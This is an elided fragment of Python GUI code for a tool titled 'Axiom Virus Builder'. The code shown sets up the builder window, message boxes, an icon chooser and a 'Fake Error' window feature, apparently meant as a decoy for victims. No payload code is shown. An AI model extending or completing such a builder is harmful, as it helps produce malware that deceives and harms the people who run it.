...
try:
    ...
    builder = ctk.CTk()
    builder.title(f"Axiom {version_tool} - Virus Builder")
    builder.geometry("800x600")
    builder.resizable(False, False)
    builder.configure(fg_color=colors["background"])
    builder.iconbitmap(os.path.join(tool_path, "Img", "Axiom_icon.ico"))
    ...
    def ErrorLogs(message):
        ...
        messagebox.showerror(f"Axiom {version_tool} - Virus Builder", message)

    def InfoLogs(message):
        messagebox.showinfo(f"Axiom {version_tool} - Virus Builder", message)
    ...
    def ChooseIcon():
        ...
        try:
            if sys.platform.startswith("win"):
                root = tkinter.Tk()
                root.iconbitmap(os.path.join(tool_path, "Img", "Axiom_icon.ico"))
                root.withdraw()
    ...
    def CreateFakeErrorWindow():
        ...
        fake_error_window.title(f"Axiom {version_tool} - Fake Error")
